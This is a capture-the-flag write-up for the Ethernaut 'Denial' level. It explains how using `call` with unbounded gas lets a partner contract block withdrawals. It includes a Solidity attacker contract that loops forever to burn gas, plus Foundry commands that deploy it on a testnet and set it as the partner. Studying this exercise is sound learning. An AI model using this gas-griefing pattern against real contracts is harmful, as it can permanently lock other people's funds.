---
layout: writeup
title: "Denial"
level: "Beginner"
category: "Ethernaut"
description: "Understand how call and transfer works.This level demonstrates a denial‑of‑service vulnerability caused by unsafe use of call with unbounded gas forwarding.
---

## Analysis
call forwards all remaining gas to the receiver, enabling arbitrary code execution and potential gas-based denial-of-service attacks, while transfer sends Ether with a fixed 2300 gas stipend and reverts on failure, making it safer but sometimes incompatible with contracts that need more gas.

**The Flaw:**
ETH is sent to partner Then ETH is sent to owner.ETH sent to partner by using `call` and it forwards all remaining gas.if attacker contract has functions like `receive()` or `fallback()` Consume all gas or revert means Owner does NOT receive ETH and withdrawal is denies forever "

## Solution

Deploy an Attacker contract (to become a partner) consists `receive()` or `fallback()` that burns gas/reverts.

**Step-by-Step:**

1.**Deploy an Attacker contract** which makes you partner.
2.**Set yourself as partner** using foundry script.
3.**Verify the exploit** whether the transaction will ran out of gas/revert or not 


**Attacker Contract (Solidity):**

<pre class="plain-code"><code>
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

contract AttackDenial {
    receive() external payable {
        while (true) {} // burn all gas
    }
}
</code></pre>

---


## Foundry Scripts

<pre class="plain-code"><code>
# 1.Deploy Attacker Contract 
forge create src/AttackDenial.sol:AttackDenial --private-key $PRIVATE_KEY  --rpc-url $SEPOLIA_RPC_URL  --broadcast

# 2. Set yourself as partner 
cast send <DENIAL_INSTANCE_ADDRESS> "setWithdrawPartner(address)" <ATTACKER_CONTRACT_ADDRESS>  --private-key $PRIVATE_KEY 
 --rpc-url $SEPOLIA_RPC_URL

# 3. Verify the exploit
cast call <DENIAL_INSTANCE_ADDRESS> "partner()(address)"  --rpc-url $SEPOLIA_RPC_URL  //checks partner is your attacker contract address or not.


</code></pre>
